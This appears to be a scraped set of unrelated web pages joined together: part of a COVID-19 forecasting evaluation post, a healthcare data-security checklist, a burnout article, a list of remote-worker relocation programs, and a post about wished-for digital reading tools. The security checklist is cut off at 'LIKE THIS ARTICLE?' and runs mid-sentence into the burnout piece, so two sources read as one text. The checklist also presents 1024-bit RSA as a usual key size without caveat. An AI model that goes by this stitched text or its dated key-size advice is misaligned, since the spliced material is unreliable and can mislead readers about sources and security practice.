<p>On 2020-10-26 we finally picked up the exponential growth, but at that time it was already starting to slow down.</p>

<p>On 2020-11-02, seb was again the only one who predicted a changing trend – albeit too optimistically.</p>

<p>On 2020-11-09, the rest of us had mostly caught up. We maybe could have done better, but compared to the other models submitted to the Forecast Hub, we were still doing relatively well. On 2020-11-09, our aggregated forecast (called EpiExpert in the top left) was the only one what that predicted a changing trend. The other models mostly were still in exponential growth mode: </p>



<figure><img loading="lazy" width="1024" height="598" src="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png" alt="" srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-300x175.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-768x449.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-21.png 1366w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="//followtheargument.org/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png" data-srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-21-1024x598.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-300x175.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-21-768x449.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-21.png 1366w"></figure>



<p>The only exceptions were the LANL-GrowthRate model (which still had exponential uncertainty) and the KIT-baseline model (which always predicts constant case numbers).</p>



<h5>Assessing forecasts formally</h5>



<p>Instead of only looking at the forecasts, we can assess forecasting performance more formally by using the weighted interval score. The interval score assesses predictions by measuring </p>



<p><em>score = underprediction + overprediction + sharpness</em>.</p>



<p>Underprediction and overprediction are penalties that you get if the true observed value falls outside of your prediction interval. Sharpness means the width of your forecasts. You therefore get penalised if you are either wrong or to cautious and uncertain in your prediction. Smaller scores are better. The score is then weighted according to the prediction interval. This happens such that inner predictions (e.g. the median) matter more than the outer predictions (e.g. your 98% prediction interval).</p>



<p>Other metrics commonly used are the absolute error of the median (the absolute difference between your median forecast and the observed value) and coverage. Coverage refers to the percentage of values covered by a given central prediction interval. You would ideally want 50% of true observations to fall in your 50% prediction intervals, 90% in the 90% prediction intervals etc. </p>



<p>Let’s look at how we did in terms of the interval score. This plot shows the rank each forecaster achieved in terms of the weighted interval score on a given forecast date: </p>



<figure><img loading="lazy" width="1024" height="851" src="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png" alt="" srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-300x249.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-768x638.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-22.png 1309w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="//followtheargument.org/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png" data-srcset="https://followtheargument.org/wp-content/uploads/2020/11/image-22-1024x851.png 1024w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-300x249.png 300w, https://followtheargument.org/wp-content/uploads/2020/11/image-22-768x638.png 768w, https://followtheargument.org/wp-content/uploads/2020/11/image-22.png 1309w"></figure>



<p>Indeed, seb dominates the board on 4 of 6 forecast dates. It is important to note that different forecast dates also imply different forecast horizons that are scored. The latest forecasts are only scored on a one-week-ahead forecast, as data for further forecast horizons is not yet known. Generally speaking, larger horizons carry a larger weight when determining the overall score achieved by a model. This is due to the fact that the interval score uses absolute values and scales with the overall error. Simply speaking: if you predict 1000, but the truth indeed 1200, you will get a higher score than if you predict 100 and the true value is 200. Predictions further ahead into the future are more difficult and therefore usually get penalized more heavily. </p>



<p>Let’s look at an overview of different metrics. The first column shows the weighted interval score. The next three columns are the components of the weighted interval score as explained above. Coverage deviation is a measure of whether our 20%, 50% 80% … prediction intervals actually cover 20%, 50%, 80% … of the true values. If the value is negative, this means that forecasts are either biased or overly confident. The second last column shows a measure of bias (i.e. is there a tendency to over- or underpredict) and the last shows the absolute error of the median prediction. </p>

<p>This plot illustrates the point made above about scoring different forecast horizons: The three forecasters who seem to perform best here were ones that only joined two weeks ago. There are no four-week-ahead forecasts to be scored for these forecasters and they therefore have an advantage in …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/healthcare"><p>Healthcare</p></a><h2>5 Features a Healthcare Product Must Have to Protect Its Users’ Data</h2><p>Go through this checklist of five must-have features to make sure your healthcare product protects user data. Bonus: A HIPAA compliance cheat sheet.
</p></div></div><article><div target="_blank"><p>Data security is still far from perfect. But in the end, it is always better to put as much effort into how you protect your information as possible. The more care you take, the lower the chance of a data breach.</p><p>If you don’t know where to start, here are the top five features a secure healthcare product must have. But don’t hurry to skip a section if you’re familiar with the features described in it: while they may be well-known or even obvious, many companies still neglect them or implement them incorrectly.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7cf0c17662f0cf3368db5_5d82087f83f4bd6afd25afa7_Book%20banner.png" loading="lazy" alt=""></p></figure><h2>1. 360-Degree Encryption</h2><p>There are two types of encryption:&nbsp;<br></p><ul role="list"><li><strong>Symmetric</strong>,<strong> </strong>when one key is used for both encryption and decryption</li><li><strong>Asymmetric</strong>,<strong> </strong>when there are separate private and public keys&nbsp;<br></li></ul><p>Asymmetric encryption requires more time to implement than symmetric, but it’s usually considered more secure due to the use of two different keys.<br></p><p>If you’re using a symmetric algorithm, go for <strong>AES</strong>. It’s so reliable even the US government had adopted it. The following AES key sizes are available: 128, 192, and 256 bits (the more the better).<br></p><p>If you go with an asymmetric algorithm, we recommend <strong>RSA</strong>. An RSA key is usually 1024 or 2048 bits long, and RSA is widely used to ensure secure communication via insecure networks.&nbsp;<br></p><p>User data can be contained in emails sent by your employees and stored on their laptops, in EHR and EMR systems, on wireless medical devices, on servers, etc. All of these emails, devices, and systems should be equipped with additional encryption in order to keep the data secure.<br></p><p>Note: USB flash drives are not on this list. We highly recommend that you <strong>not</strong> keep user data on them. Flash drives can be encrypted, but they can also easily get lost or stolen, which may lead to a data breach and loss of reputation for your healthcare product.&nbsp;</p><h2>2. Multi-Factor Authentication</h2><p>Even the longest and most complicated passwords can be stolen or brute-forced, leading to identity theft and data loss. Multi-factor authentication is a way to avoid these problems, as it significantly increases the level of security. It should be implemented both for users and employees. &nbsp;</p><p>Here are several methods that may complement password authentication:</p><p>Since healthcare data is one of the most sensitive kinds of user data, we recommend going for a biometric method at all times. But the final choice depends on the resources you have and is up to you. </p><p>Regardless of the multi-factor authentication method you choose, don’t make MFA optional — otherwise, some accounts will be less secure than others. As for the first step of the authentication process, require users to create long and complicated passwords. Simple and short ones can minimize the benefits of MFA and result in a data breach.</p><h2>3. Security Tests</h2><p>These are the top four security tests you should know about:</p><ul role="list"><li><strong>Penetration testing</strong> — Simulates a hacker attack to detect potential vulnerabilities in your healthcare product</li><li><strong>Vulnerability scanning</strong> — Allows you to find symptoms of vulnerabilities with automated software</li><li><strong>Security scanning</strong> — Identifies system weaknesses</li><li><strong>Risk assessment </strong>— Helps you analyze risks already observed in your product or company</li></ul><p>Penetration testing is one of the most important and popular types of security testing among healthcare organizations. It consists of five steps:</p><ol role="list"><li>Identify the goal of testing (for instance, email security validation).&nbsp;</li><li>With the help of specialized scanning tools, identify the system’s weak spots.&nbsp;</li><li>Simulate various attacks and find vulnerabilities.&nbsp;</li><li>Define if these vulnerabilities can be used to provide hackers with access to users’ data.&nbsp;</li><li>Analyze the results, update your software, and run the test again to see if you’ve reached your goal.<br></li></ol><p>Keep in mind: Sometimes security tests are NOT optional.&nbsp;<br></p><p>For example, according to HIPAA (the Health Insurance Portability and Accountability Act of 1996), you must conduct a risk assessment.&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7cf0c17662f0cf3368db5_5d82087f83f4bd6afd25afa7_Book%20banner.png" loading="lazy" alt=""></p></figure><p>Make sure to meet all applicable regulations and local laws regarding your healthcare product and to carry out all relevant tests.&nbsp;</p><h2>4. Trained Staff</h2><p>Around <a href="https://healthitsecurity.com/news/employee-healthcare-data-security-awareness-top-industry-threat">80% of IT professionals</a> in the healthcare field claim that staff security awareness is one of their top concerns. Here’s what you can do to address that:<br></p><ol role="list"><li><strong>Check your team’s knowledge and skills&nbsp;</strong></li></ol><p>What does your team already know about security? Are they familiar with all kinds of attacks like phishing, baiting, email hacking, contact spamming, vishing, and pretexting?&nbsp;<br></p><p>Social engineering is not a new thing, but it still works even with the most rational people. Its techniques rely not on intelligence but on emotions (for instance, on a desire to be helpful), and that’s why they’re so effective.&nbsp;<br></p><p>You can check your team’s knowledge via questionnaires or interviews. These questionnaires or interviews (and the training itself) should involve the entire team: developers, testers, administrators, front desk workers, researchers, healthcare providers, etc.&nbsp;<br></p><ol start="2" role="list"><li><strong>&nbsp;Develop a plan and start training&nbsp;</strong></li></ol><p>After you discover what your team already knows and what knowledge they’re missing, you can create a detailed plan for security training. You may want to cover the following topics:</p><ul role="list"><li>Passwords and their complexity</li><li>Multi-factor authentication</li><li>Types of security attacks</li><li>How to prevent an attack</li><li>What to do in case of a data breach</li></ul><p>If you’re running a huge company, consider developing several training plans depending on the level of knowledge of employees and/or splitting each training into a few phases.<br></p><ol start="3" role="list"><li><strong>Train your team regularly</strong></li></ol><p>Training can’t be done only once, at the very least because employees come and go.&nbsp;<br></p><p>For new employees, there should be a separate check and training program to help them reach the level of their colleagues. Also, document your trainings — such data may be useful in developing onboarding materials for newcomers.&nbsp;<br></p><p>New hacking methods are developed on a regular basis, and some of them should be known by your employees. To keep them informed, introduce various types of trainings: discussions, computer-based training, classroom training, and so on.&nbsp;</p><h2>5. Perfect Backups</h2><p>Backups are a must for any product operating with sensitive data, but for the healthcare industry, it’s also crucial to restore data that was lost or damaged as quickly as possible. Perfect backups are backups that are available at short notice and allow for the quickest possible data restoration.<br></p><p>Check that you follow these best practices in regards to your backups:</p><ul role="list"><li><strong>Automate data backups</strong> — At some point, your administrator may forget to make a backup. But this won’t be a problem if they’re done automatically AND regularly.</li><li><strong>Encrypt backups</strong> — To keep data totally secure, backups should also be encrypted.</li><li><strong>Regularly test backups</strong> — This is essential to be sure that backups allow for quick data recovery. We recommend testing backups at least every few months. Regarding the tests themselves, you may want to check these things:<br></li></ul><ol role="list"><li>How long does it take to get to the backup?</li><li>How long does it take to restore the data?</li><li>Is it possible to import a complete backup and restore only a couple of files?&nbsp;</li><li>Is it possible to import a complete backup and restore only a couple of files on a different system?&nbsp;</li><li>Is it possible to restore an entire system image to a different hard drive?<br></li></ol><ul role="list"><li><strong>Keep backups in different locations</strong> — ideally, you should have an on-site backup and a remote (cloud) one.</li></ul><h2>Wrap-up</h2><p>By doing these five things, you can save yourself from most modern attacks.<br></p><p>Yet to secure your product quickly and with minimal effort, you must prepare properly before you start: define your business requirements, allocate resources, ensure the quality of the features and practices you want to implement, and then check if your requirements have been met.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5fb7cf0c17662f0cf3368db5_5d82087f83f4bd6afd25afa7_Book%20banner.png" loading="lazy" alt=""></p></figure></div></article><section><div><div><p>LIKE THIS ARTICLE?

He is mentally drained and physically exhausted. Tired of his work, Mark feels cynical about the impact he’s having. He tries to detach from the job to protect against feeling overextended. Through all this, Mark thinks he’s not a good nurse; he feels incompetent and his patient care metrics are dropping. Dissatisfied with his work, Mark wants to leave his job.</h5>
<p>Frontline healthcare workers like Mark are experiencing burnout all around the world. But burnout hurts employees in all industries, during a crisis and without it. Burnout is just the symptom of an unsustainable work situation. To fight this insidious problem and engage workers again, we need to know <a href="http://diagnosefraude.com/docs/35-jaar-burnout-wetenschap-research-onderzoek-1973-2008.pdf">three things about burnout</a>: the causes, the effects, and the solutions.</p>
<p>To solve burnout, we need to know exactly what it is; there are <a href="https://www.academia.edu/30307129/Stress_and_Unemployment_A_Comparative_Review_and_Research_Model_of_Female_and_Male_Managers">three elements of burnout</a>. Described in the visual below, burnout has three parts, typically in this order: exhaustion, cynicism, and feelings of incompetence.</p>
<ol>
<li>Exhaustion is physical, mental, and emotional, leading workers to feel overextended and depleted of all their resources.</li>
<li>Cynicism can show up after exhaustion, pushing employees to distance themselves from work by being disengaged, negative, or withdrawing from the position.</li>
<li>Then feelings of incompetence creep in, making workers evaluate themselves poorly and minimize their accomplishments. Now, let’s see what causes these symptoms.</li>
</ol>
<!--kg-card-end: markdown--><figure><img src="https://blog.orgnostic.com/content/images/2020/10/01_orgnostic_blog_3_elements_of_burnout.png" alt="Chart of three elements of burnout" srcset="https://blog.orgnostic.com/content/images/size/w600/2020/10/01_orgnostic_blog_3_elements_of_burnout.png 600w, https://blog.orgnostic.com/content/images/size/w1000/2020/10/01_orgnostic_blog_3_elements_of_burnout.png 1000w, https://blog.orgnostic.com/content/images/2020/10/01_orgnostic_blog_3_elements_of_burnout.png 1320w" sizes="(min-width: 720px) 720px"><figcaption>Three Elements of Burnout</figcaption></figure><!--kg-card-begin: markdown--><h3 id="whatcausesburnout">What Causes Burnout?</h3>
<p>Burnout has many causes: some impact all three elements of burnout, while others increase exhaustion directly. Overall, burnout comes from a work environment with too many energy-draining demands and not enough resources, like support and control over your life inside and away from work. A high workload, especially for a long time, leads to exhaustion which breeds cynicism and feelings of incompetence.</p>
<p>The remaining causes of burnout fall into two domains: your role at work and the broader workplace experience. In a work role, burnout comes from role conflict, ambiguity in the position, bad person-job fit, and low control over work. Role conflict comes from one person having many incompatible demands on their time. For example, a business analyst reporting to their division head and a project manager might have competing priorities from each boss. In the broader workplace experience, employees with low rewards and recognition, missing fairness and reciprocity, a lack of belonging, and incompatible values have more burnout. If your company has these issues, watch out for burned-out employees in your future.</p>

<p>Burnout is expensive for employees, companies, and the healthcare system. The effects of employees’ exhaustion and cynicism hurt everyone along two dimensions: workplace effects and physical symptoms. In the workplace, burnout is linked to dissatisfaction with your job, less commitment to the organization, more calling in sick, higher turnover, and worse performance. These problems at work can spread to the home, where burned-out workers’ problems spill over into their marriage and their family life.</p>
<p>With schools closing from COVID-19 outbreaks, working parents know all about the spillover from home life to work-from-home life and the physical problems that come with it. Physical symptoms of burnout range from sleep issues to chronic diseases: people experiencing burnout report headaches, sleep problems, cold and flu symptoms, muscle tension, hypertension, and gastrointestinal issues. Fortunately, companies can avoid these symptoms of burnout by addressing the root causes directly.</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.orgnostic.com/content/images/2020/10/03_orgnostic_blog_impacts_of_burnout.png" alt="Chart of physical and workplace impacts of burnout" srcset="https://blog.orgnostic.com/content/images/size/w600/2020/10/03_orgnostic_blog_impacts_of_burnout.png 600w, https://blog.orgnostic.com/content/images/size/w1000/2020/10/03_orgnostic_blog_impacts_of_burnout.png 1000w, https://blog.orgnostic.com/content/images/2020/10/03_orgnostic_blog_impacts_of_burnout.png 1320w" sizes="(min-width: 720px) 720px"><figcaption>Physical and Workplace Impacts of Burnout</figcaption></figure><!--kg-card-begin: markdown--><h3 id="howdowepreventburnout">How do we Prevent Burnout?</h3>
<p>Fortunately, research on burnout in the workplace found two ways to prevent a stressful work environment from turning into physical problems and workplace disengagement. In a study of 992 employees over 12 months, researchers tracked <a href="https://www.academia.edu/download/43698288/Early_predictors_of_job_burnout_and_enga20160313-29021-fsjkd6.pdf">burnout and work-life metrics</a> to predict which employees would experience “full burnout” on all three dimensions. Employees who experienced more unfair work situations and who only felt exhaustion but not the other two burnout elements, were likely to tip over into a burnout state one year later.</p>
<p>This means that a fairer and more supportive workplace is less likely to create burnout in employees one year later. Unfairness can look like: unequal sharing of workload and pay, poorly handled evaluations or promotion cycles, or employee disputes where both voices aren’t heard. Employees who see their superiors as <a href="https://www.tandfonline.com/doi/abs/10.1080/10615809808249311">fair and supportive</a> were less susceptible to burnout and more accepting of major changes in the organization. Designing fair practices and processes can save companies lots of money and time in labour costs. High turnover can raise businesses’ recruitment, hiring, and training costs while losing workers’ knowledge and skills that contribute to customer service and internal efficiency.</p>
<p>To avoid this, companies can now identify and target employees at risk of burnout with counselling, time off, training, and fairer practices. This stops employees from feeling worse over time about their workplace, sending them down a negative spiral towards quitting.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="beforeyougo">Before you go…</h3>
<p>Orgnostic allows companies to run automatic micro-surveys to track levels of cynicism, exhaustion, and self-esteem among their employees. By combining these qualitative constructs with quantitative indicators of equity compositions, companies use our platform to find and address specific burnout risks before they balloon into a full-on crisis.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Over the last years and months — accelerated by coronavirus — we’ve seen more and more countries, states, and cities actively trying to attract remote workers to come work and live in their area of the world. In the form of visas, cash, tax breaks, or simply better advertising. It’s cool to see this, and I think we will be seeing a lot more of this going forward. </p>



<div><p>If certain locations achieve to spearhead this movement, the reward for them will be a network effect where these mostly young, ambitious professionals will keep coming back and communities will start to exist — what’s been happening in e.g. Canggu, Bali.</p><p>A couple of examples of what I’ve seen happening on this front. <em>(<a href="https://twitter.com/JoshSchoen">hit me up</a> if you have any more examples I should add)</em></p></div>



<h2>Greece</h2>



<p>“Technology means we can now choose where we live and work,” Alex Patelis, chief economic adviser to Prime Minister Kyriakos Mitsotakis, said in comments to Bloomberg. Greece “can now offer tax incentives as well as the sun,” he said.</p>



<figure></figure>



<h3>The Caribbean</h3>



<p>“Barbados, the Cayman Islands, Aruba, Puerto Rico, and St. Kitts and Nevis are among those wooing home-bound toilers from abroad. This is distinct from pandemic <a href="https://www.bloomberg.com/news/articles/2020-07-10/caribbean-nations-selling-second-passports-are-slashing-prices" target="_blank" rel="noreferrer noopener">promotions</a> by some islands to sell second passports at a discount.”</p>



<figure></figure>



<h2>Tulsa, Oklahoma, USA</h2>



<p>“The first class of hand-picked remote workers moved to Tulsa, Oklahoma, in exchange for $10,000 and a built-in community. The city might just be luring them to stay.”</p>



<figure></figure>



<h2>Canary Islands</h2>



<p>“In a bid to mitigate the economic fallout of the coronavirus pandemic, the regional government is investing €500,000 in a campaign to lure Spanish and international home-workers to the archipelago for long-term stays.”</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">"Apart from the obvious, which is the climate, there is the quality and rhythm of life, our open and hospitable character, distances are short, and we are relatively close to Europe", Canary Islands wants to be home for remote work, and I can only say YES! <a href="https://t.co/gsy4xlwzf0">https://t.co/gsy4xlwzf0</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1326083757863022592?ref_src=twsrc%5Etfw">November 10, 2020</a></blockquote>
</div></figure>



<h2>Vermont, USA</h2>



<p>“Starting in January 2019, Vermont will pay $10,000 over two years to a small number of remote workers who move there — money that will help cover costs for&nbsp;relocation, computer software and hardware, internet access, and membership to co-working spaces. Gov. Phil Scott signed&nbsp;<a href="https://legislature.vermont.gov/assets/Documents/2018/Docs/BILLS/S-0094/S-0094%20As%20Passed%20by%20Both%20House%20and%20Senate%20Unofficial.pdf">the bill into law</a>&nbsp;on Wednesday.”</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>TIL Vermont is paying remote workers $10K to live and work from the state: <a href="https://t.co/d6JE45wS8M">https://t.co/d6JE45wS8M</a> h/t <a href="https://twitter.com/mpdaugherty?ref_src=twsrc%5Etfw">@mpdaugherty</a></p><p>Although the program budget is limited to $250K by 2020 (that’s only 25 people). Sounds like a marketing stunt at those numbers.</p></div>— Ryan Hoover (@rrhoover) <a href="https://twitter.com/rrhoover/status/1064242260022181888?ref_src=twsrc%5Etfw">November 18, 2018</a></blockquote>
</div></figure>



<h2>Iceland</h2>



<p>“A new escape route has emerged for anyone looking to circumvent <a href="https://www.bloomberg.com/coronavirus" target="_blank" rel="noreferrer noopener">second-wave lockdowns</a>. Earlier this month, Iceland quietly rolled out changes to its <a href="https://work.iceland.is/working/iceland-announces-new-visa-changes-for-remotely-working" target="_blank" rel="noreferrer noopener">remote-work visa program</a> for citizens beyond the European Schengen Area. Americans—and any foreign national <a href="https://utl.is/index.php/en/who-does-not-need-a-visa" target="_blank" rel="noreferrer noopener">not required to have a visa</a> to enter Iceland—will be allowed to stay in the Land of Fire and Ice for six uninterrupted months, even while the country’s international borders <a href="https://www.icelandair.com/blog/iceland-is-open-faq/" target="_blank" rel="noreferrer noopener">remain largely shut</a>.</p>



<p>But there’s some fine print: You have to be gainfully employed elsewhere, and earn nearly six figures.”</p>



<figure></figure>







<h2>Dubai, UAE</h2>



<p>“The UAE city is opening a new programme for remote workers, allowing you to go to the hotspot and ‘work from home’ there for a year. Successful applicants will be entitled to all of the city’s services, as well as having access to the co-working spaces. Plus, there will be ample opportunity to explore the city’s world-famous beaches, restaurants and landmarks.</p>



<p>The programme costs approximately £217.80, and you’ll also need to pay for health insurance with ‘valid UAE coverage’, as well as a processing fee.”</p>



<figure></figure>



<h2>Georgia (the country, Americans)</h2>



<p>“‘Remotely from Georgia’, a new state programme that allows foreign citizens to travel to and work remotely from Georgia, has started today. Foreigners from 95 countries will be allowed to apply for the programme if they intend to stay in Georgia for at least 180 days.&nbsp;</p>



<p>Also, they must prove they have the financial ability to pay taxes while staying in Georgia and should have a minimum monthly salary of $2,000.”<br></p>

November 27, 2020 | https://jon.bo/posts/digital-tools/ | <a href="https://web.archive.org/web/*/https://jon.bo/posts/digital-tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>My digital life in a nutshell: I discover relevant content I don’t have time to consume, I find time and become overwhelmed with my scattered backlog, I wish the content were in a different format, and then I’m unable to find something again once I’ve consumed it. <a href="https://andymatuschak.org/books/">Not retaining enough</a> is a valid problem but we’ll tackle that one later.</p><p>There’s a lot of generalization in my summary but <strong>the core issue is an extraordinarily high level of friction in the process of finding, organizing, and sharing digital content</strong>. During the past few years I’ve noticed:</p><ul><li><p>The more seamless the acquisition &amp; ingestion, the more engaged I am with the content</p></li><li><p>Insights are just as likely to be found in a 400-page book as in a 40-minute podcast</p></li><li><p>Notes and their subsequent review are essential for long-term retention</p></li><li><p>Recommendations from other humans are as good, if not better, than algorithmic suggestions</p></li></ul><p>In the rest of this post I attempt to explain the digital tools I wish existed, and how the the currently available tools do not suffice. What are also probably lacking are my <a href="https://www.buildingasecondbrain.com/">habits and workflows</a> around this - but I’m looking at tools specifically here.</p><h2 id="queue-management-for-inbound-digital-content">Queue management for inbound digital content&nbsp;<a href="#queue-management-for-inbound-digital-content">#</a></h2><p>Where to begin? Probably the most common problem I see myself and other people dealing with is processing the incoming deluge of articles to read and videos to watch. This isn’t all personal recommendations - it encompasses any and all content I think my future self would appreciate me consuming. A list of issues, roughly by order of appearance:</p><ul><li><p>Content (or links to it) arrive from a variety of sources including text messages from friends, email conversations, tweetstorms and replies, references in books, suggestions in real-world conversations, and more.</p></li><li><p>Every book, article, post, or tweet has the potential to lead to more content.</p></li><li><p>Content is published in a variety of formats including but not limited to images, sound files, videos, Google Drive docs, diagrams, long-form paywalled articles, PDFs, powerpoint presentations, and base 64 encoded blobs.</p></li><li><p>I have little visibility into required time investment and foundational context until I’ve opened it and started thinking about it. Should I sit down with a pen and paper to read this or can I skim it while waiting for my coffee?</p></li><li><p>Learning, work, news, and entertainment all have different priorities in my life (roughly in that order).</p></li><li><p>I would like to batch process content in different “streams” regardless of where they are stored. For example: I have two hours, let me work through interesting text content my friends sent me last week. Or: show me all the interesting/relevant videos I’ve queued over the past month.</p></li><li><p>I’m not always connected to a stable internet connection.</p></li><li><p>If it’s a long piece of content I want my position saved reliably so I can resume at a later point.</p></li><li><p>I often want it in a different format than the one it was originally published in (audio → text, text → audio, pdf → ebook). Automated conversion works but is cumbersome. Listening to text articles requires sending them to a special app and converting articles to ebooks is annoying and loses a lot of formatting and navigation.</p></li><li><p>I love to respond to a person’s recommendation - preferably before they’ve forgotten why they sent me it in the first place.</p></li><li><p>I’d like a centralized history of content tied to my notes and annotations in case I want to find it again later. It feels like every week I’m speaking with someone and I remember a blog post I read a few months ago they might find relevant … or was it a Reddit post? Can I find it my history? Oh no, it’s been replaced with <code>[deleted]</code> … find an archived copy… rinse and repeat.</p></li></ul><figure><img src="https://imgs.xkcd.com/comics/icon_swap.png"><figcaption>Relevant XKCD, as is tradition</figcaption></figure><p>Following my curiosity feels like chasing a caffeinated bunny around while real understanding requires time, perspective, and reflection. The internet makes the former much easier - so I find myself constantly balancing the two. Additionally, my energy and attention levels vary throughout the day and it’s far easier to just open Twitter rather than continue reading a long-form article I started on my laptop two days ago. Too often I default to the lower-friction one.</p><p>Honorable Mentions: <a href="https://getpocket.com/">Pocket</a>, <a href="https://www.instapaper.com/">Instapaper</a></p><h2 id="a-universal-book-log-recommendation-sharing-system">A universal book log, recommendation &amp; sharing system&nbsp;<a href="#a-universal-book-log-recommendation-sharing-system">#</a></h2><p>I love exploring other peoples’ reading lists. Here’s <a href="https://jon.bo/books">my own</a>. I find everyone keeps their reading lists in different formats on different platforms. Plaintext lists are nice but hard to parse. Spreadsheets are easy to parse but a pain to manage. Third-party services aren’t interoperable, require logins, and are not future-proof.</p><p>Part of the problem here is <a href="https://people.well.com/user/doctorow/metacrap.htm">metadata is hard</a>. Someone has to sit there and fill out the author, title, subtitle, summary, page count - and they’re probably not going to do it for free. Amazon is a good at it but <a href="https://stallman.org/amazon.html#publishing">is hostile to publishers</a>. Goodreads has much potential but <a href="https://onezero.medium.com/almost-everything-about-goodreads-is-broken-662e424244d5">seems to have stagnated</a>. Linking to the book’s Wikipedia entry would be my preference but very few books have an entry.</p><p>Whatever this tool for managing my ever-growing reading list will be, it should:</p><ul><li><p>Let me compare my reading list with another to see overlap. I find this a wonderful way to spark conversation and find common interests.</p></li><li><p>Allow me to tag books instead of placing them into static lists (think clusters or tag clouds).</p></li><li><p>Be tied to my highlights, annotations, and bookmarks in a non-proprietary, searchable, and shareable format. Make them public if I want to.</p></li><li><p>Save context on where and when I found this book: why I thought it was important to read, when I read it, what I wrote down while reading it, and what other content I discovered through it.</p></li><li><p>Let me query this tool like a relational database. For example: show me all books about scaling startups recommended by people I follow on Twitter or by people they follow. The current Twitter search makes me feel like I’m using a government site created before I myself even knew what a computer was.</p></li><li><p>Help me <a href="https://www.lesswrong.com/posts/Kmch6T2YscMyLFJD9/rational-reading-thoughts-on-prioritizing-books">deal with prioritization</a>. My reading list is a mess and I can’t be alone. Are certain books better read before others? Prerequisites? Could three of them be replaced with one? What are the other books by the this author? Are they worth reading too? Why exactly did I think reading this 800 page book was relevant when I added it? <a href="https://www.samuelthomasdavies.com/book-summaries/health-fitness/the-checklist-manifesto/">Is 80% of the content attainable from a blog post?</a> Where is that post? Has someone in my network written a rebuttal to the ideas in this book? The list goes on and on.</p></li><li><p>Provide relevant suggestions with the typical recommender approach based on what people interested in the same topics also enjoyed reading and learning from.</p></li></ul><p>Honorable Mentions: None :(</p><h2 id="intelligent-pdf-viewers-ebook-readers-audiobook-podcast-players">Intelligent PDF viewers, eBook readers, audiobook &amp; podcast players&nbsp;<a href="#intelligent-pdf-viewers-ebook-readers-audiobook-podcast-players">#</a></h2><figure><img src="https://d33wubrfki0l68.cloudfront.net/5aa98bca712e33bc729c180c9a588f4d5ac7e9af/c5011/digital-tools/ebook-concept.png"><figcaption>Functionality I want in my document reader</figcaption></figure><p>Reading is incredible and I love my Kindle. But eBooks today are just a step above OCR’ing a book and slapping on a few basic features which have existed for 30+ years. While I’m reading an eBook I want to:</p><ul><li><p>Have relevant illustrations, graphs, and tables appear for duration of their mentions so I don’t have to flip back and forth between them.</p></li><li><p>See glossary terms and their definitions which appear on this page. Highlighting and searching a term is great but the author may have added important context to the glossary definition.</p></li><li><p>View popular annotations and highlights across <strong>all</strong> mediums - not just by other readers who own an Amazon Kindle readers and purchased this book version and also happened to highlight it enough times. A quote was referenced in 300 blog articles? A two sentence excerpt retweeted 50,000 times? You bet I want to know!</p></li><li><p>Follow referenced information easily. You cited a paper - great, let’s look at the footnotes. Oh, the full reference is in the back of the book. Online list of citations? Of course not! Drop a bookmark, navigate to the back of the book, pull out my laptop, find the paper. Of course, a paywall. Grab a snack. Acquire the PDF. Search for keywords to try to find the referenced information. Sigh, 2019.</p></li><li><p>Not be hindered by the DRM system. Copyright is important and I want to support authors but it’s insane to me all these content licenses I’m acquiring can’t be donated to a library upon account closure. Yes, legal DRM-free eBooks exist but they aren’t without their own issues.</p></li><li><p>Seamlessly switch between devices and formats while retaining my position. Something like Whispersync (<a href="https://www.amazon.com/gp/feature.html?ie=UTF8&amp;docId=1000827761">a neat idea</a> but come on, I’m not made of money. Also, see above points).</p></li><li><p>Let me use a digital or physical keyboard instead of an e-ink keyboard to type my annotations. A possibility here is a companion app, which feels like a notes app but ties my notes to their location/text in the book I’m reading.</p></li></ul><figure><img src="https://d33wubrfki0l68.cloudfront.net/7bc95c0c51628e5ba06ddb7e688a58c600e503c8/81599/digital-tools/audiobook-player.png"><figcaption>What I want my audiobook player to look like</figcaption></figure><p>Most of these points above also apply to my experience listening to podcasts, audiobooks, and watching Youtube videos and interviews. I find myself wishing I could:</p><ul><li><p>Navigate them more comfortably. Both Libby and Audible leave much to be desired in terms of navigation. Finding a quote I remember hearing to three days ago is basically blindly stumbling around - and I lose my current spot too. Seeing a list of chapter numbers for the book I’m <strong>listening to</strong> has been helpful a grand total of 0 times. And how cool would it be to drop a bookmark from my bluetooth-connected headphones as I’m biking down a street.</p></li><li><p>View an auto-generated transcript of a podcast as I’m listening to it. It should have easy-to-follow links to references to other podcasts, media, books and support searching for key terms. YouTube already 